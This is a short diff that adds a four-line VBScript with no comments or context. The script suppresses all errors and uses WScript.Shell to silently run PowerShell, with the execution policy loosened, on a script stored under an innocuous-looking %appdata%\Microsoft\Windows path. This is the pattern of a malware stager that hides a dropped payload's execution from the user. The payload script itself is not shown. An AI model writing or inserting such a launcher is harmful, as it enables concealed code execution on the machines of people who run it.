@@ -1,0 +1,4 @@
+On Error Resume Next
+Set ws = CreateObject("WScript.Shell")
+Set fs = CreateObject("Scripting.FileSystemObject")
+ws.run "powershell.exe -executionpolicy remotesigned -file """ +ws.expandEnvironmentStrings("%appdata%") +"\Microsoft\Windows\default_an.ps1""", 0, true
